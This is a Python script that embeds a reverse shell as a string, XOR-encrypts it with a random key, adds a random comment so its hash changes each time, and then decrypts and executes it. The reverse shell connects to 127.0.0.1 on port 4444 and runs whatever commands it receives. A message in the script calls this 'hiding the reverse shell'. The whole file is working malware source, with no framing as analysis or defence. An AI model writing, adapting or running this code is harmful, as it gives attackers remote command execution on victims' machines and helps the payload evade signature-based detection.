import os
import socket
import subprocess
import random
import hashlib

def encrypt(data, key):
    return ''.join(chr(ord(char) ^ key) for char in data)

def decrypt(data, key):
    return encrypt(data, key)  

reverse_shell_code = '''
import os
import socket
import subprocess

def reverse_shell():
    host = '127.0.0.1'
    port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))
    s.close()

reverse_shell()
'''

def modify_reverse_shell_code():
    random_comment = f"# Random comment: {random.randint(1, 100000)}"
    return f"{random_comment}\n\n{reverse_shell_code}"

key = random.randint(1, 255)

modified_shell_code = modify_reverse_shell_code()

encrypted_shell_code = encrypt(modified_shell_code, key)

def self_modify():
    try:
        decrypted_shell_code = decrypt(encrypted_shell_code, key)
        
        print("Decrypted code:")
        print(decrypted_shell_code)
        
        exec(decrypted_shell_code)
    except Exception as e:
        print(f"An error occurred: {e}")

def check_signature():
    signature = hashlib.sha256(encrypted_shell_code.encode()).hexdigest()
    print(f"Program signature (SHA-256 hash): {signature}")

if __name__ == "__main__":
    print("Encrypting and hiding the reverse shell...")
    self_modify() 
    check_signature() 
